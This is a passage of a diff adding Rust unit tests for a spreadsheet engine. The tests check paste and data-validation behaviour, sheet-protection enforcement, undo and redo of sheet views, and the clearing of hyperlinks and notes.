+fn object_move_rotation_respects_sheet_protection() {
+    let mut s = s();
+    let id = s.execute("insert.shape", json!({"kind": "rectangle", "at": "A1"})).unwrap()["shape"].clone();
+    let id_num = id.as_u64().unwrap() as u32;
+    let shape_state = |session: &Session| {
+        let doc = session.doc().unwrap();
+        let shape = doc.wb.active().unwrap().shapes.iter().find(|shape| shape.id == id_num).unwrap();
+        (shape.anchor, shape.rotation)
+    };
+
+    // Rotation remains available on an unprotected sheet.
+    s.execute("object.move", json!({"kind": "shape", "id": id_num, "at": "B2", "rotation": 45})).unwrap();
+    let (anchor, rotation) = shape_state(&s);
+    assert_eq!(rotation, 45.0);
+    assert_eq!(anchor.cell, CellRef::parse("B2").unwrap());
+    s.execute("edit.undo", json!({})).unwrap();
+
+    s.execute("review.protectSheet", json!({})).unwrap();
+    let before = shape_state(&s);
+    let undo_len = s.doc().unwrap().undo.len();
+
+    let result = s.execute("object.move", json!({"kind": "shape", "id": id_num, "at": "C3", "rotation": 90}));
+    assert!(result.is_err(), "rotation should be rejected on a protected sheet");
+    assert_eq!(shape_state(&s), before, "a rejected rotation leaves the shape unchanged");
+    assert_eq!(s.doc().unwrap().undo.len(), undo_len);
 }
 
 #[test]
@@ -4647,6 +6132,290 @@ fn csv_as_text_keeps_identifier_columns_as_written() {
     }
     let saved = s.execute("file.saveBytes", json!({"format": "csv"})).unwrap();
     assert_eq!(crate::io::base64_decode(saved["base64"].as_str().unwrap()).unwrap(), csv.replace('\n', "\r\n").as_bytes());
+}
+
+fn validation_areas(s: &Session) -> Vec<String> {
+    let sh = s.doc().unwrap().wb.active().unwrap();
+    let mut out: Vec<String> = sh.validations.iter().map(|dv| dv.ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(" ")).collect();
+    out.sort();
+    out
+}
+
+/// ft-3ir.10.16: pasting whole columns walked every one of their 1,048,576 rows and added one
+/// single-cell validation rule per pasted cell, re-cutting every rule each time (the fuzz run
+/// aborted on a 34 GB allocation). Validation now pastes as ranges and only cells that hold
+/// something are visited.
+#[test]
+fn whole_column_paste_with_validation_works_on_ranges() {
+    let mut s = s();
+    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
+    s.execute("cell.set", json!({"cell": "C1", "input": "1"})).unwrap();
+    s.execute("cell.set", json!({"cell": "D1048576", "input": "2"})).unwrap();
+    s.execute("cell.set", json!({"cell": "F100", "input": "old"})).unwrap();
+    s.execute("data.validation", json!({"range": "C:C", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
+    s.execute("data.validation", json!({"range": "F:H", "type": "list", "formula1": "\"a,b\""})).unwrap();
+    s.execute("edit.copy", json!({"range": "C:D"})).unwrap();
+    s.execute("edit.paste", json!({"at": "F1"})).unwrap();
+    assert_eq!(v(&s, "F1"), Value::Number(1.0));
+    assert_eq!(v(&s, "G1048576"), Value::Number(2.0));
+    assert_eq!(v(&s, "F100"), Value::Empty, "the whole column is replaced, below the copied text too");
+    // One rule per copied rule, over whole columns; G (D had no rule) has none; H keeps the list.
+    assert_eq!(validation_areas(&s), ["C:C", "F:F", "H:H"]);
+    assert!(!ok(&mut s, "F500", "-1"));
+    assert!(ok(&mut s, "G500", "anything"));
+    assert!(!ok(&mut s, "H500", "c"));
+    assert_eq!(s.doc().unwrap().selection.a1(), "F:G");
+    // Undo gives the list back over F:H.
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(validation_areas(&s), ["C:C", "F:H"]);
+    assert_eq!(v(&s, "F100"), Value::Text("old".into()));
+}
+
+/// Paste Link of whole columns links the cells the columns hold, wherever they start.
+#[test]
+fn paste_link_of_whole_columns_links_the_used_rows() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "C5", "input": "1"})).unwrap();
+    s.execute("cell.set", json!({"cell": "C6", "input": "2"})).unwrap();
+    s.execute("edit.copy", json!({"range": "C:C"})).unwrap();
+    s.execute("edit.pasteSpecial", json!({"what": "all", "link": true, "at": "F1"})).unwrap();
+    assert_eq!(v(&s, "F1"), Value::Number(0.0), "a link to a blank cell reads 0");
+    assert_eq!(v(&s, "F5"), Value::Number(1.0));
+    assert_eq!(v(&s, "F6"), Value::Number(2.0));
+    assert_eq!(s.execute("cell.get", json!({"cell": "F5"})).unwrap()["input"], json!("=C5"));
+}
+
+/// A transposed paste clears the destination cells that line up with blank source cells.
+#[test]
+fn transposed_paste_clears_destination_cells_under_blank_source_cells() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A2", "input": "3"})).unwrap();
+    s.execute("cell.set", json!({"cell": "B2", "input": "4"})).unwrap();
+    s.execute("cell.set", json!({"cell": "E2", "input": "old"})).unwrap();
+    s.execute("cell.set", json!({"cell": "F1", "input": "older"})).unwrap();
+    s.execute("edit.copy", json!({"range": "A1:B2"})).unwrap();
+    s.execute("edit.pasteSpecial", json!({"what": "all", "transpose": true, "at": "E1"})).unwrap();
+    assert_eq!(v(&s, "E1"), Value::Number(1.0));
+    assert_eq!(v(&s, "E2"), Value::Empty, "B1 was blank");
+    assert_eq!(v(&s, "F1"), Value::Number(3.0));
+    assert_eq!(v(&s, "F2"), Value::Number(4.0));
+}
+
+/// A copy tiled over a larger selection clears the non-blank destination cells under its blanks,
+/// in every tile.
+#[test]
+fn tiled_paste_clears_destination_cells_under_blank_source_cells() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
+    s.execute("cell.set", json!({"cell": "C2", "input": "x"})).unwrap();
+    s.execute("cell.set", json!({"cell": "C4", "input": "y"})).unwrap();
+    s.execute("edit.copy", json!({"range": "A1:A2"})).unwrap();
+    s.execute("selection.set", json!({"range": "C1:C4"})).unwrap();
+    s.execute("edit.paste", json!({})).unwrap();
+    assert_eq!(v(&s, "C1"), Value::Number(1.0));
+    assert_eq!(v(&s, "C2"), Value::Empty);
+    assert_eq!(v(&s, "C3"), Value::Number(1.0));
+    assert_eq!(v(&s, "C4"), Value::Empty);
+}
+
+/// #3934: a row copied into a taller, narrower selection repeats down every selected row at the
+/// copy's width, as in Excel; a column copied into a wider, shorter one repeats across.
+#[test]
+fn paste_into_a_narrower_selection_repeats_the_copy_down_its_rows() {
+    for dest in ["A3:A6", "A3:B6"] {
+        let mut s = s();
+        s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2]]})).unwrap();
+        s.execute("edit.copy", json!({"range": "A1:B1"})).unwrap();
+        s.execute("selection.set", json!({"range": dest})).unwrap();
+        let r = s.execute("edit.paste", json!({})).unwrap();
+        assert_eq!(r["pasted"], json!("A3:B6"), "{dest}");
+        for row in 3..=6 {
+            assert_eq!(v(&s, &format!("A{row}")), Value::Number(1.0), "{dest} row {row}");
+            assert_eq!(v(&s, &format!("B{row}")), Value::Number(2.0), "{dest} row {row}");
+        }
+        assert_eq!(v(&s, "A2"), Value::Empty);
+        assert_eq!(v(&s, "A7"), Value::Empty);
+    }
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2]]})).unwrap();
+    s.execute("edit.copy", json!({"range": "A1:A2"})).unwrap();
+    s.execute("selection.set", json!({"range": "C1:F1"})).unwrap();
+    let r = s.execute("edit.paste", json!({})).unwrap();
+    assert_eq!(r["pasted"], json!("C1:F2"));
+    for col in ["C", "D", "E", "F"] {
+        assert_eq!(v(&s, &format!("{col}1")), Value::Number(1.0), "{col}1");
+        assert_eq!(v(&s, &format!("{col}2")), Value::Number(2.0), "{col}2");
+    }
+}
+
+/// #3934: repeating a wide copy down a narrow selection writes the copy's width on every row, so
+/// the 4,000,000-cell limit on a tiled paste counts that area, not the selection's. Past it the
+/// copy is pasted once, as a tiled paste over too large a selection already is.
+#[test]
+fn a_row_repeated_down_a_narrow_selection_is_bounded_by_the_area_it_fills() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[1]]})).unwrap();
+    s.execute("range.setValues", json!({"range": "P1", "values": [[2]]})).unwrap();
+    s.execute("edit.copy", json!({"range": "A1:P1"})).unwrap();
+    // 300,000 rows selected, 4,800,000 cells once the copy's 16 columns are repeated down them.
+    s.execute("selection.set", json!({"range": "A3:A300002"})).unwrap();
+    let r = s.execute("edit.paste", json!({})).unwrap();
+    assert_eq!(r["pasted"], json!("A3:P3"));
+    assert_eq!(v(&s, "P3"), Value::Number(2.0));
+    assert_eq!(v(&s, "A4"), Value::Empty);
+}
+
+/// Excel refuses a paste that would run off the sheet rather than pasting part of it: whole
+/// columns below row 1, whole rows right of column A, a whole column transposed, or a block at
+/// the last row or column.
+#[test]
+fn paste_that_does_not_fit_on_the_sheet_is_refused() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "C1", "values": [[1, 2], [3, 4]]})).unwrap();
+    s.execute("cell.set", json!({"cell": "A15", "input": "x"})).unwrap();
+    let before = s.doc().unwrap().wb.clone();
+    s.execute("edit.copy", json!({"range": "C:D"})).unwrap();
+    assert!(s.execute("edit.paste", json!({"at": "B8"})).is_err());
+    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "transpose": true, "at": "A1"})).is_err());
+    s.execute("edit.copy", json!({"range": "15:15"})).unwrap();
+    assert!(s.execute("edit.paste", json!({"at": "AN17"})).is_err());
+    s.execute("edit.copy", json!({"range": "C1:D2"})).unwrap();
+    assert!(s.execute("edit.paste", json!({"at": "XFD1"})).is_err());
+    assert!(s.execute("edit.paste", json!({"at": "A1048576"})).is_err());
+    s.execute("edit.cut", json!({"range": "C1:D2"})).unwrap();
+    assert!(s.execute("edit.paste", json!({"at": "XFD1"})).is_err());
+    let after = s.doc().unwrap().wb.clone();
+    assert_eq!(after.active().unwrap().cells.len(), before.active().unwrap().cells.len());
+    assert_eq!(v(&s, "C1"), Value::Number(1.0));
+    // Whole rows still paste at column A, whole columns at row 1.
+    s.execute("edit.copy", json!({"range": "15:15"})).unwrap();
+    s.execute("edit.paste", json!({"at": "A20"})).unwrap();
+    assert_eq!(v(&s, "A20"), Value::Text("x".into()));
+}
+
+/// Paste visits only cells that hold something on either side: a blank copied cell still clears
+/// (or reformats) a destination cell that holds something, and blank onto blank stays blank, even
+/// with an operation (Excel leaves it empty rather than writing 0).
+#[test]
+fn paste_blank_cells_clear_destination_and_blank_onto_blank_stays_blank() {
+    let mut s = s();
+    let has_cell = |s: &Session, a: &str| s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse(a).unwrap()).is_some();
+    s.execute("cell.set", json!({"cell": "A1", "input": "5"})).unwrap();
+    s.execute("cell.set", json!({"cell": "D2", "input": "7"})).unwrap();
+    s.execute("edit.copy", json!({"range": "A1:A3"})).unwrap();
+    s.execute("edit.pasteSpecial", json!({"what": "values", "operation": "add", "at": "D1"})).unwrap();
+    assert_eq!(v(&s, "D1"), Value::Number(5.0));
+    assert_eq!(v(&s, "D2"), Value::Number(7.0));
+    assert!(!has_cell(&s, "D3"), "blank + blank stays blank");
+    s.execute("cell.set", json!({"cell": "F2", "input": "old"})).unwrap();
+    s.execute("edit.paste", json!({"at": "F1"})).unwrap();
+    assert_eq!(v(&s, "F1"), Value::Number(5.0));
+    assert!(!has_cell(&s, "F2"), "a blank copied cell clears the destination");
+    s.execute("home.bold", json!({"range": "H2"})).unwrap();
+    assert!(has_cell(&s, "H2"));
+    s.execute("edit.pasteSpecial", json!({"what": "formats", "at": "H1"})).unwrap();
+    assert!(!has_cell(&s, "H2"), "a blank copied cell's format replaces the bold");
+}
+
+/// Validation pastes over the whole pasted area (a blank copied cell's rule included, as Excel
+/// does), and cuts only the pasted cells out of a rule the block lands inside.
+#[test]
+fn paste_validation_covers_the_pasted_area_as_ranges() {
+    let mut s = s();
+    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
+    s.execute("cell.set", json!({"cell": "A1", "input": "5"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A3", "input": "6"})).unwrap();
+    s.execute("data.validation", json!({"range": "A1:A3", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
+    s.execute("data.validation", json!({"range": "D1:D3", "type": "list", "formula1": "\"x,y\""})).unwrap();
+    s.execute("edit.copy", json!({"range": "A1:A3"})).unwrap();
+    s.execute("edit.pasteSpecial", json!({"what": "all", "skipBlanks": true, "at": "D1"})).unwrap();
+    assert!(!ok(&mut s, "D2", "-1"), "the blank copied cell's rule is pasted too");
+    assert!(ok(&mut s, "D2", "3"));
+    assert_eq!(validation_areas(&s), ["A1:A3", "D1:D3"]);
+
+    // A block with a rule on its middle cells pasted inside a bigger list rule.
+    let mut s = self::s();
+    s.execute("data.validation", json!({"range": "A2:A3", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
+    s.execute("data.validation", json!({"range": "C1:E10", "type": "list", "formula1": "\"p,q\""})).unwrap();
+    s.execute("edit.copy", json!({"range": "A1:A4"})).unwrap();
+    s.execute("edit.paste", json!({"at": "D4"})).unwrap();
+    assert_eq!(validation_areas(&s), ["A2:A3", "C1:E3 C4:C7 E4:E7 C8:E10", "D5:D6"]);
+    assert!(ok(&mut s, "D4", "anything"));
+    assert!(!ok(&mut s, "D5", "-1"));
+    assert!(!ok(&mut s, "D3", "z"));
+
+    // One copied cell tiled over a selection is one rule over the selection.
+    s.execute("edit.copy", json!({"range": "A2"})).unwrap();
+    s.execute("selection.set", json!({"range": "G1:G4"})).unwrap();
+    s.execute("edit.paste", json!({})).unwrap();
+    assert!(validation_areas(&s).contains(&"G1:G4".to_string()));
+}
+
+/// Paste Special > Validation, checked against Excel 16.0: A1 has a list rule, A2 is blank with a
+/// whole-number rule, A3 is blank with no rule, over C1:C3 that hold a decimal rule. With Skip
+/// Blanks a blank source cell that has a rule still pastes it, and one without keeps the
+/// destination's rule; without it the destination's rule is cleared.
+#[test]
+fn paste_validation_skip_blanks_keeps_rules_under_blank_cells_without_one() {
+    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
+    for skip in [true, false] {
+        let mut s = s();
+        s.execute("data.validation", json!({"range": "A1", "type": "list", "formula1": "\"x,y\""})).unwrap();
+        s.execute("data.validation", json!({"range": "A2", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
+        s.execute("data.validation", json!({"range": "C1:C3", "type": "decimal", "operator": "greater", "formula1": "0"})).unwrap();
+        s.execute("edit.copy", json!({"range": "A1:A3"})).unwrap();
+        s.execute("edit.pasteSpecial", json!({"what": "validation", "skipBlanks": skip, "at": "C1"})).unwrap();
+        assert!(!ok(&mut s, "C1", "z"), "C1 gets A1's list rule (skip {skip})");
+        assert!(!ok(&mut s, "C2", "1.5"), "C2 gets A2's whole-number rule (skip {skip})");
+        assert_eq!(ok(&mut s, "C3", "-1"), !skip, "C3 keeps its decimal rule only when blanks are skipped");
+    }
+}
+
+/// A big populated Skip Blanks validation paste is not refused for its cell count: only
+/// validation areas are limited, and with no rule under the paste nothing is cleared.
+#[test]
+fn paste_validation_skip_blanks_large_populated_paste() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1:A100002", "values": (0..100_002).map(|i| vec![i]).collect::<Vec<_>>()})).unwrap();
+    s.execute("edit.copy", json!({"range": "A1:A100002"})).unwrap();
+    s.execute("edit.pasteSpecial", json!({"what": "validation", "skipBlanks": true, "at": "C1"})).unwrap();
+    assert!(validation_areas(&s).is_empty());
+
+    // A destination rule is cleared under every populated source cell. Count the resulting
+    // coalesced ranges, not the 100,002 cells that were considered for clearing.
+    let mut s = self::s();
+    s.execute("range.setValues", json!({"range": "A1:A100002", "values": (0..100_002).map(|i| vec![i]).collect::<Vec<_>>()})).unwrap();
+    s.execute("data.validation", json!({"range": "C1:C100002", "type": "list", "formula1": "\"x,y\""})).unwrap();
+    s.execute("edit.copy", json!({"range": "A1:A100002"})).unwrap();
+    s.execute("edit.pasteSpecial", json!({"what": "validation", "skipBlanks": true, "at": "C1"})).unwrap();
+    assert!(validation_areas(&s).is_empty());
+}
+
+/// A whole-column copy of a filtered range takes only the rows showing, also when they form one
+/// block (the hidden rows are all at the end) and the selection covers the whole column.
+#[test]
+fn whole_column_copy_of_a_filtered_range_leaves_the_hidden_rows_out() {
+    for hidden_tail in [false, true] {
+        let mut s = s();
+        let mut rows = vec![json!(["Val", "Tag"])];
+        for i in 2..=11 {
+            let hide = if hidden_tail { i >= 8 } else { [3, 5, 7, 9].contains(&i) };
+            rows.push(json!([format!("v{i}"), if hide { "hide" } else { "keep" }]));
+        }
+        s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
+        s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
+        s.execute("data.filter", json!({})).unwrap();
+        s.execute("data.filterBy", json!({"column": "B", "values": ["keep"]})).unwrap();
+        s.execute("cell.set", json!({"cell": "H30", "input": "old"})).unwrap();
+        s.execute("edit.copy", json!({"range": "A:B"})).unwrap();
+        s.execute("edit.paste", json!({"at": "H1"})).unwrap();
+        let col: Vec<Value> = (1..=11).map(|r| v(&s, &format!("H{r}"))).collect();
+        let want: Vec<&str> =
+            if hidden_tail { vec!["Val", "v2", "v3", "v4", "v5", "v6", "v7"] } else { vec!["Val", "v2", "v4", "v6", "v8", "v10", "v11"] };
+        let want: Vec<Value> = want.into_iter().map(Value::from).chain(std::iter::repeat(Value::Empty)).take(11).collect();
+        assert_eq!(col, want, "hidden rows stay out of a whole-column copy (hidden tail: {hidden_tail})");
+    }
 }
 
 /// Open a workbook by path, and `CELL("filename")` names the file it came from, as Excel does;
@@ -5185,6 +6954,42 @@ fn move_columns_checks_the_protection_of_the_named_sheet() {
 }
 
 #[test]
+fn move_columns_checks_the_protection_of_a_sheet_named_by_its_range() {
+    // A `Sheet!` range or cell picks the sheet the move modifies; the protection checks must
+    // authorize that sheet too, not the active one.
+    let mut s = s();
+    s.execute("home.insertSheet", json!({"name": "P"})).unwrap();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2, 3, 4]]})).unwrap();
+    s.execute("review.protectSheet", json!({})).unwrap();
+    s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
+    for key in ["range", "cell"] {
+        let err = s.execute("sheet.moveColumns", json!({key: "P!A1", "cols": "B:C", "before": 4})).expect_err("moving columns on a protected sheet");
+        assert!(err.to_string().contains("protected"), "{err}");
+    }
+    let d = s.doc().unwrap();
+    let sh = &d.wb.sheets[d.wb.sheet_index("P").unwrap()];
+    let pv: Vec<Value> = (0..4).map(|c| sh.value(CellRef::new(0, c))).collect();
+    assert_eq!(pv, vec![Value::number(1.0), Value::number(2.0), Value::number(3.0), Value::number(4.0)]);
+}
+
+#[test]
+fn sorting_cannot_unlock_a_locked_cell_by_moving_equal_content_onto_it() {
+    // An unlocked 2 sorted onto a locked 2 leaves the content as it was, but would make the cell
+    // editable; the sort is refused instead.
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[2], [2], [1]]})).unwrap();
+    s.execute("home.lockCell", json!({"range": "A1", "on": false})).unwrap();
+    s.execute("home.lockCell", json!({"range": "A3", "on": false})).unwrap();
+    s.execute("review.protectSheet", json!({"sort": true})).unwrap();
+    let before = s.doc().unwrap().wb.clone();
+    let err =
+        s.execute("data.sort", json!({"range": "A1:A3", "header": false, "keys": [{"column": "A", "order": "asc"}]})).expect_err("sort unlocking A2");
+    assert!(err.to_string().contains("protected sheet"), "{err}");
+    assert_eq!(*s.doc().unwrap().wb, *before);
+    assert!(s.execute("cell.set", json!({"cell": "A2", "input": "9"})).is_err(), "A2 stays locked");
+}
+
+#[test]
 fn a_script_cannot_switch_windows() {
     // Stored scripts are scoped to their workbook: a step that activates another window would
     // point every later step at another open document, so it is refused before any step runs.
@@ -5202,7 +7007,25 @@ fn a_script_cannot_switch_windows() {
     assert_eq!(v(&s, "A1"), Value::number(2.0));
 }
 
+mod chart_data;
+mod controls;
+mod equation;
+mod json_golden;
 mod macros;
+mod objects;
+mod python_cells;
+mod python_commands;
+mod python_files;
+
+#[test]
+fn text_to_columns_keeps_a_mid_field_quote() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "'5\" pipe,abc"})).unwrap();
+    s.execute("data.textToColumns", json!({"range": "A1", "delimiters": [","]})).unwrap();
+    assert_eq!(v(&s, "A1"), Value::text("5\" pipe"));
+    assert_eq!(v(&s, "B1"), Value::text("abc"));
+}
+
 mod seams;
 
 #[test]
@@ -5233,4 +7056,869 @@ fn a_saved_workbook_keeps_its_values_until_an_edit_reaches_them() {
 fn unique_nonce() -> u64 {
     static N: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
     N.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
+}
+
+/// Normal, Page Layout and Page Break Preview are not undo steps (as in Excel), so undoing or
+/// redoing an edit keeps each sheet in the view it is in now, instead of putting back the view
+/// of the snapshot it swaps in. Found through the command-sequence fuzz (seed 177).
+#[test]
+fn undo_and_redo_keep_each_sheets_view() {
+    use gridcraft_model::SheetViewMode;
+    let view = |s: &Session, i: usize| s.doc().unwrap().wb.sheet(i).unwrap().view;
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
+    s.execute("view.pageBreakPreview", json!({})).unwrap();
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(v(&s, "A1"), Value::Empty);
+    assert_eq!(view(&s, 0), SheetViewMode::PageBreakPreview, "undo leaves the view alone");
+    s.execute("view.pageLayout", json!({})).unwrap();
+    s.execute("edit.redo", json!({})).unwrap();
+    assert_eq!(v(&s, "A1"), Value::Number(1.0));
+    assert_eq!(view(&s, 0), SheetViewMode::PageLayout, "redo leaves the view alone");
+
+    // Undoing a rename: the sheet is found at its position under the restored name.
+    s.execute("sheet.rename", json!({"sheet": 0, "name": "Renamed"})).unwrap();
+    s.execute("view.normal", json!({})).unwrap();
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_ne!(s.doc().unwrap().wb.sheet(0).unwrap().name, "Renamed");
+    assert_eq!(view(&s, 0), SheetViewMode::Normal);
+
+    // Undoing a new sheet: the other sheets keep theirs.
+    s.execute("view.pageBreakPreview", json!({})).unwrap();
+    s.execute("home.insertSheet", json!({"name": "Extra"})).unwrap();
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(s.doc().unwrap().wb.sheets.len(), 1);
+    assert_eq!(view(&s, 0), SheetViewMode::PageBreakPreview);
+}
+
+#[test]
+fn a_multi_step_undo_keeps_views_through_each_step() {
+    // A rename and a new sheet undone in one call: neither the name nor the sheet count matches
+    // between the first and last workbook, so the view is carried step by step.
+    let mut s = s();
+    let first = s.doc().unwrap().wb.sheet(0).unwrap().name.clone();
+    s.execute("sheet.rename", json!({"sheet": 0, "name": "Renamed"})).unwrap();
+    s.execute("view.pageBreakPreview", json!({"sheet": 0})).unwrap();
+    s.execute("home.insertSheet", json!({"name": "Extra"})).unwrap();
+    s.execute("edit.undo", json!({"steps": 2})).unwrap();
+    let d = s.doc().unwrap();
+    assert_eq!(d.wb.sheets.len(), 1);
+    assert_eq!(d.wb.sheet(0).unwrap().name, first);
+    assert_eq!(d.wb.sheet(0).unwrap().view, gridcraft_model::SheetViewMode::PageBreakPreview);
+    s.execute("edit.redo", json!({"steps": 2})).unwrap();
+    let d = s.doc().unwrap();
+    assert_eq!((d.wb.sheets.len(), d.wb.sheet(0).unwrap().name.as_str()), (2, "Renamed"));
+    assert_eq!(d.wb.sheet(0).unwrap().view, gridcraft_model::SheetViewMode::PageBreakPreview);
+}
+
+#[test]
+fn a_view_kept_through_redo_doesnt_make_the_saved_workbook_dirty() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
+    {
+        let d = s.doc_mut().unwrap();
+        d.saved = d.wb.clone();
+    }
+    s.execute("edit.undo", json!({})).unwrap();
+    s.execute("view.pageBreakPreview", json!({})).unwrap();
+    s.execute("edit.redo", json!({})).unwrap();
+    let d = s.doc().unwrap();
+    assert_eq!(d.wb.active().unwrap().view, gridcraft_model::SheetViewMode::PageBreakPreview);
+    assert!(!d.is_dirty(), "back at the saved edits, the view alone isn't a change");
+}
+
+#[test]
+fn workbook_display_options_are_commands() {
+    // #3101: Show sheet tabs / horizontal / vertical scroll bar, toggling without `on`, saved with
+    // the workbook and undoable.
+    let mut s = Session::new();
+    s.new_workbook();
+    let view = |s: &Session| s.doc().unwrap().wb.view;
+    assert_eq!(s.execute("view.showSheetTabs", json!({})).unwrap()["on"], json!(false));
+    assert_eq!(s.execute("view.showHorizontalScrollBar", json!({"on": false})).unwrap()["on"], json!(false));
+    assert_eq!(s.execute("view.showVerticalScrollBar", json!({"on": false})).unwrap()["on"], json!(false));
+    let v = view(&s);
+    assert!(!v.show_sheet_tabs && !v.show_horizontal_scroll && !v.show_vertical_scroll);
+    let (back, _) = gridcraft_xlsx::read_xlsx(&gridcraft_xlsx::write_xlsx(&s.doc().unwrap().wb).unwrap()).unwrap();
+    assert_eq!(back.view, v, "saved with the workbook");
+    s.execute("edit.undo", json!({})).unwrap();
+    assert!(view(&s).show_vertical_scroll);
+    assert_eq!(s.execute("view.showSheetTabs", json!({})).unwrap()["on"], json!(true), "toggles back");
+}
+
+/// A link from a file can sit on a cell with nothing stored in it, past the used range (or on a
+/// sheet with no cells at all). Clear Hyperlinks, and Remove Hyperlink in the cell menu, must
+/// still remove it.
+#[test]
+fn clear_hyperlinks_removes_links_on_cells_with_nothing_stored() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
+    let link = || gridcraft_model::Hyperlink { target: "https://example.com".into(), tooltip: None, external: true };
+    let (a1, c5) = (CellRef::parse("A1").unwrap(), CellRef::parse("C5").unwrap());
+    std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap().hyperlinks.insert(c5, link());
+    s.execute("edit.clearHyperlinks", json!({"range": "C5"})).unwrap();
+    assert!(!s.doc().unwrap().wb.active().unwrap().hyperlinks.contains_key(&c5), "the link past the used range is removed");
+
+    // No cells at all.
+    s.execute("edit.clearAll", json!({"range": "A1"})).unwrap();
+    std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap().hyperlinks.insert(a1, link());
+    s.execute("edit.clearHyperlinks", json!({"range": "A1"})).unwrap();
+    assert!(!s.doc().unwrap().wb.active().unwrap().hyperlinks.contains_key(&a1), "the link on an empty sheet is removed");
+}
+
+/// Notes and links aren't cell contents, so the cell comparison that guards a protected sheet
+/// doesn't see them go: Clear Hyperlinks and Clear Comments refuse locked cells themselves,
+/// stored or not.
+#[test]
+fn clearing_links_and_notes_respects_sheet_protection() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
+    let link = || gridcraft_model::Hyperlink { target: "https://example.com".into(), tooltip: None, external: true };
+    let (a1, c5) = (CellRef::parse("A1").unwrap(), CellRef::parse("C5").unwrap());
+    {
+        let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
+        sh.hyperlinks.insert(a1, link());
+        sh.hyperlinks.insert(c5, link());
+    }
+    s.execute("review.newNote", json!({"cell": "C5", "text": "note", "author": "Example"})).unwrap();
+    s.execute("review.protectSheet", json!({})).unwrap();
+    for (cmd, range) in [("edit.clearHyperlinks", "A1"), ("edit.clearHyperlinks", "C5"), ("edit.clearComments", "C5")] {
+        assert!(s.execute(cmd, json!({"range": range})).is_err(), "{cmd} on locked {range}");
+    }
+    let sh = s.doc().unwrap().wb.active().unwrap().clone();
+    assert!(sh.hyperlinks.contains_key(&a1) && sh.hyperlinks.contains_key(&c5) && sh.comments.contains_key(&c5), "nothing removed");
+
+    s.execute("review.unprotectSheet", json!({})).unwrap();
+    s.execute("edit.clearHyperlinks", json!({"range": "A1:C5"})).unwrap();
+    s.execute("edit.clearComments", json!({"range": "C5"})).unwrap();
+    let sh = s.doc().unwrap().wb.active().unwrap().clone();
+    assert!(sh.hyperlinks.is_empty() && sh.comments.is_empty());
+}
+
+/// A removed link or note is a change to its cell even when nothing is stored there, so a
+/// recorded macro's footprint lists it.
+#[test]
+fn clearing_links_and_notes_records_their_cells() {
+    let mut s = s();
+    let c5 = CellRef::parse("C5").unwrap();
+    std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb)
+        .sheet_mut(0)
+        .unwrap()
+        .hyperlinks
+        .insert(c5, gridcraft_model::Hyperlink { target: "https://example.com".into(), tooltip: None, external: true });
+    s.execute("review.newNote", json!({"cell": "D7", "text": "note", "author": "Example"})).unwrap();
+    s.doc_mut().unwrap().touched = Some(Vec::new());
+    s.execute("edit.clearHyperlinks", json!({"range": "C5"})).unwrap();
+    s.execute("edit.clearComments", json!({"range": "D7"})).unwrap();
+    let touched: Vec<String> = s.doc().unwrap().touched.clone().unwrap_or_default().into_iter().map(|(_, c)| c.a1()).collect();
+    assert!(touched.contains(&"C5".to_string()) && touched.contains(&"D7".to_string()), "{touched:?}");
+}
+
+/// The locked-cell check for notes and links keeps Allow Edit Ranges: a range without a password
+/// allows them at once, one with a password once it's unlocked in this session.
+#[test]
+fn clearing_links_and_notes_keeps_allow_edit_ranges() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
+    let link = || gridcraft_model::Hyperlink { target: "https://example.com".into(), tooltip: None, external: true };
+    let (a1, c5) = (CellRef::parse("A1").unwrap(), CellRef::parse("C5").unwrap());
+    {
+        let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
